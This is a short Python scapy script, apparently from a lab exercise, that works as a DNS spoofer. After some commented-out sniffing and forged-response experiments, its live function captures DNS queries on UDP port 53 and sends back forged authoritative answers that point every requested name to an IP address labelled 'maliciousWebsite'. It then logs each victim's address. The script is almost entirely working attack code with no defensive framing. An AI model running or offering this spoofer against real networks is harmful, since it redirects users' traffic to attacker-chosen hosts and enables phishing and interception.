import scapy.all as sc



# a = sc.sniff(timeout=60, filter="port 53", store=0)
# print(a)


# ans = sc.sr1(sc.IP(dst="8.8.8.8")/sc.UDP(sport=sc.RandShort(), dport=53)/sc.DNS(rd=1,qd=sc.DNSQR(qname="undergroundatl.com",qtype="A")))

# print(ans.an[0].rdata)
# print("\n")
# print(ans.command())

maliciousWebsite = "131.155.10.135"

# sc.send(sc.IP(version=4, ihl=5, tos=0, len=80, id=53050, flags=0, frag=0, ttl=117, proto=17,
#               src='8.8.8.8', dst='131.155.246.66')/sc.UDP(sport=53, dport=17431,
#             len=60)/sc.DNS(id=0, qr=1, opcode=0, aa=0, tc=0, rd=1, ra=1, z=0, ad=0, cd=0,
#             rcode=0, qdcount=1, ancount=1, nscount=0, arcount=0, qd=[sc.DNSQR(qname=b'undergroundatl.com.',
#             qtype=1, unicastresponse=0, qclass=1)], an=[sc.DNSRR(rrname=b'undergroundatl.com.', type=1,
#                 cacheflush=0, rclass=1, ttl=3600, rdata='131.155.244.43')]))


def dnsSpoofer(packet):
   if packet.haslayer(sc.DNS) and packet.getlayer(sc.DNS).qr == 0:
      reply_packet = sc.IP(dst=packet[sc.IP].src, src=packet[sc.IP].dst) / \
                      sc.UDP(dport=packet[sc.UDP].sport, sport=53) / \
                      sc.DNS(id=packet[sc.DNS].id, qr=1, aa=1, qd=packet[sc.DNS].qd,
                          an=sc.DNSRR(rrname=packet[sc.DNS].qd.qname, ttl=10, rdata=maliciousWebsite))

    
      sc.send(reply_packet, verbose=1)
      print({packet[sc.IP].src})
      


requests = sc.sniff(filter="udp port 53", prn=dnsSpoofer, store=1, timeout=40)
requests.show()